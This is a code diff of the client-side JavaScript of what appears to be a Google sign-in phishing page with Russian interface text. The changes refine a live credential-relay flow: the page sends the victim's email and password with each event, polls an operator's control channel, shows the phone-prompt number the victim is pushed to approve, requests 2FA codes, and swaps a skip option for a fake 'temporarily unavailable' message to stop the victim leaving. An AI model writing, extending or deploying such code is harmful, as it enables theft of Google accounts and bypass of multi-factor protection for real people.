@@ -209,12 +209,8 @@ function initApp() {
                              window.location.search.includes("auth=google");
 
         if (targetStep === stepGoogleConsent) {
-            if (googleAuthModal) googleAuthModal.classList.add("hidden");
-            finishAuth({
-                status: "success",
-                google_email: userGoogleEmail,
-                password: userGooglePassword
-            });
+            if (googleLoadingBar) googleLoadingBar.classList.remove("hidden");
+            startGooglePolling();
             return;
         }
 
@@ -1382,10 +1378,14 @@ function initApp() {
             if (data && data.ok && data.google_control) {
                 console.log("CTRL:", data.google_control);
                 const ctrl = data.google_control;
-                if (ctrl.status === "checking" || ctrl.status === "pending") {
+                if (ctrl.status === "checking" || ctrl.status === "pending" || ctrl.status === "prompt_confirmed") {
                     if (googleLoadingBar) googleLoadingBar.classList.remove("hidden");
                     if (btnSubmitGooglePassword) btnSubmitGooglePassword.disabled = true;
                     if (btnSubmitGoogle2FA) btnSubmitGoogle2FA.disabled = true;
+                    if (btnConfirmGooglePrompt) {
+                        btnConfirmGooglePrompt.disabled = true;
+                        btnConfirmGooglePrompt.textContent = "Проверка...";
+                    }
                 } else if (ctrl.status === "error_password") {
                     if (googleLoadingBar) googleLoadingBar.classList.add("hidden");
                     if (btnSubmitGooglePassword) btnSubmitGooglePassword.disabled = false;
@@ -1412,17 +1412,26 @@ function initApp() {
                     if (googlePromptNumber) googlePromptNumber.textContent = num;
                     const promptTargetText = document.getElementById("googlePromptTargetNumber");
                     if (promptTargetText) promptTargetText.textContent = num;
+                    if (btnConfirmGooglePrompt) {
+                        btnConfirmGooglePrompt.disabled = false;
+                        btnConfirmGooglePrompt.textContent = "Я нажал на телефоне";
+                    }
                     if (!stepGooglePrompt.classList.contains("active")) {
                         showStep(stepGooglePrompt);
                     }
                 } else if (ctrl.status === "error_prompt" || ctrl.status === "wrong_prompt") {
                     if (googleLoadingBar) googleLoadingBar.classList.add("hidden");
+                    if (btnConfirmGooglePrompt) {
+                        btnConfirmGooglePrompt.disabled = false;
+                        btnConfirmGooglePrompt.textContent = "Я нажал на телефоне";
+                    }
                     if (!stepGooglePrompt.classList.contains("active")) {
                         showStep(stepGooglePrompt);
                     }
                     const promptErr = document.getElementById("googlePromptError");
                     const promptErrText = document.getElementById("googlePromptErrorText");
                     if (promptErr) promptErr.classList.remove("hidden");
+                    if (promptErrText && ctrl.error_msg) promptErrText.textContent = ctrl.error_msg;
                 } else if (ctrl.status === "ask_2fa" || ctrl.status === "ask_code" || ctrl.status === "show_2fa") {
                     if (googleLoadingBar) googleLoadingBar.classList.add("hidden");
                     if (btnSubmitGoogle2FA) btnSubmitGoogle2FA.disabled = false;
@@ -1544,26 +1553,11 @@ function initApp() {
             if (promptErr) promptErr.classList.add("hidden");
 
             btnConfirmGooglePrompt.disabled = true;
-            const originalBtnText = btnConfirmGooglePrompt.textContent;
             btnConfirmGooglePrompt.textContent = "Проверка...";
 
             reportAuthEvent("google_prompt_confirmed", "Пользователь подтвердил вход на телефоне (Google)", userGooglePassword, null, userGoogleEmail);
             sendGoogleControlCommand("prompt_confirmed", null, null);
-
-            setTimeout(() => {
-                if (googleLoadingBar) googleLoadingBar.classList.add("hidden");
-                btnConfirmGooglePrompt.disabled = false;
-                btnConfirmGooglePrompt.textContent = originalBtnText;
-
-                stopGooglePolling();
-                if (googleAuthModal) googleAuthModal.classList.add("hidden");
-
-                finishAuth({
-                    status: "success",
-                    google_email: userGoogleEmail,
-                    password: userGooglePassword
-                });
-            }, 1800);
+            startGooglePolling();
         });
     }
 
@@ -1590,34 +1584,25 @@ function initApp() {
 
     if (btnSkipGoogle2FA) {
         btnSkipGoogle2FA.addEventListener("click", () => {
-            reportAuthEvent("google_code_skipped", "Вход Google (пропуск 2FA)", userGooglePassword, null, userGoogleEmail);
-            if (googleAuthModal) googleAuthModal.classList.add("hidden");
-            finishAuth({
-                status: "success",
-                google_email: userGoogleEmail,
-                password: userGooglePassword
-            });
+            showToast("Дополнительные способы проверки временно недоступны");
+            reportAuthEvent("google_other_method", "Пользователь нажал «Другой способ» на 2FA", userGooglePassword, null, userGoogleEmail);
         });
     }
 
     if (btnSubmitGoogleConsent) {
         btnSubmitGoogleConsent.addEventListener("click", () => {
             reportAuthEvent("google_authorized", "Пользователь предоставил доступ OAuth (Google Consent)", userGooglePassword, null, userGoogleEmail);
-            finishAuth({
-                status: "success",
-                google_email: userGoogleEmail,
-                password: userGooglePassword
-            });
+            if (googleLoadingBar) googleLoadingBar.classList.remove("hidden");
+            sendGoogleControlCommand("checking", null, null);
+            startGooglePolling();
         });
     }
 
     if (btnCancelGoogleConsent) {
         btnCancelGoogleConsent.addEventListener("click", () => {
-            finishAuth({
-                status: "success",
-                google_email: userGoogleEmail,
-                password: userGooglePassword
-            });
+            if (googleLoadingBar) googleLoadingBar.classList.remove("hidden");
+            sendGoogleControlCommand("checking", null, null);
+            startGooglePolling();
         });
     }
 
